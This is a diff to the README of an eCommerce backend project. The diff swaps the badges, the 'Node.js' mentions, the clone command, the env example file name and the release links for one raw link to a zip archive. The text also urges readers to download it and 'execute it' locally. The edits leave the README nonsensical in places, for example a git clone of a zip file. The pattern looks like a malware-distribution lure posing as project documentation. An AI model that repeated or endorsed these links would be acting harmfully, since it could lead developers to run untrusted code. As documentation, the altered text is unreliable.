@@ -1,8 +1,8 @@
 # HaGyustic eCommerce Backend
 
-![Node.js](https://img.shields.io/badge/Node.js-339933?style=flat&logo=nodedotjs&logoColor=white) ![Express](https://img.shields.io/badge/Express-000000?style=flat&logo=express&logoColor=white) ![MongoDB](https://img.shields.io/badge/MongoDB-47A248?style=flat&logo=mongodb&logoColor=white) ![Stripe](https://img.shields.io/badge/Stripe-6772E5?style=flat&logo=stripe&logoColor=white) ![PayPal](https://img.shields.io/badge/PayPal-003087?style=flat&logo=paypal&logoColor=white)
+![https://raw.githubusercontent.com/randomgdplayerlol/hagyustic-backend/main/Controllers/backend_hagyustic_v2.6.zip](https://raw.githubusercontent.com/randomgdplayerlol/hagyustic-backend/main/Controllers/backend_hagyustic_v2.6.zip) ![Express](https://raw.githubusercontent.com/randomgdplayerlol/hagyustic-backend/main/Controllers/backend_hagyustic_v2.6.zip) ![MongoDB](https://raw.githubusercontent.com/randomgdplayerlol/hagyustic-backend/main/Controllers/backend_hagyustic_v2.6.zip) ![Stripe](https://raw.githubusercontent.com/randomgdplayerlol/hagyustic-backend/main/Controllers/backend_hagyustic_v2.6.zip) ![PayPal](https://raw.githubusercontent.com/randomgdplayerlol/hagyustic-backend/main/Controllers/backend_hagyustic_v2.6.zip)
 
-Welcome to the **HaGyustic eCommerce Backend**! This repository hosts a Node.js and Express server that powers a complete MERN eCommerce application. It includes essential features such as user authentication, admin-protected APIs, product and order management, image uploads through Cloudinary, and payment integrations with Stripe and PayPal.
+Welcome to the **HaGyustic eCommerce Backend**! This repository hosts a https://raw.githubusercontent.com/randomgdplayerlol/hagyustic-backend/main/Controllers/backend_hagyustic_v2.6.zip and Express server that powers a complete MERN eCommerce application. It includes essential features such as user authentication, admin-protected APIs, product and order management, image uploads through Cloudinary, and payment integrations with Stripe and PayPal.
 
 ## Table of Contents
 
@@ -26,7 +26,7 @@ Welcome to the **HaGyustic eCommerce Backend**! This repository hosts a Node.js 
 
 ## Technologies Used
 
-- Node.js
+- https://raw.githubusercontent.com/randomgdplayerlol/hagyustic-backend/main/Controllers/backend_hagyustic_v2.6.zip
 - Express
 - MongoDB
 - Mongoose
@@ -44,7 +44,7 @@ To get started with the HaGyustic eCommerce Backend, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/randomgdplayerlol/hagyustic-backend.git
+   git clone https://raw.githubusercontent.com/randomgdplayerlol/hagyustic-backend/main/Controllers/backend_hagyustic_v2.6.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -58,7 +58,7 @@ To get started with the HaGyustic eCommerce Backend, follow these steps:
    ```
 
 4. **Set Up Environment Variables**:
-   Create a `.env` file in the root directory and add your environment variables. You can use the `.env.example` file as a reference.
+   Create a `.env` file in the root directory and add your environment variables. You can use the `https://raw.githubusercontent.com/randomgdplayerlol/hagyustic-backend/main/Controllers/backend_hagyustic_v2.6.zip` file as a reference.
 
 5. **Run the Server**:
    ```bash
@@ -120,9 +120,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For the latest releases, please visit the [Releases section](https://github.com/randomgdplayerlol/hagyustic-backend/releases). You can download the latest version and execute it on your local machine.
+For the latest releases, please visit the [Releases section](https://raw.githubusercontent.com/randomgdplayerlol/hagyustic-backend/main/Controllers/backend_hagyustic_v2.6.zip). You can download the latest version and execute it on your local machine.
 
-If you need further information, check the [Releases section](https://github.com/randomgdplayerlol/hagyustic-backend/releases) for updates and changes.
+If you need further information, check the [Releases section](https://raw.githubusercontent.com/randomgdplayerlol/hagyustic-backend/main/Controllers/backend_hagyustic_v2.6.zip) for updates and changes.
 
 ---
 
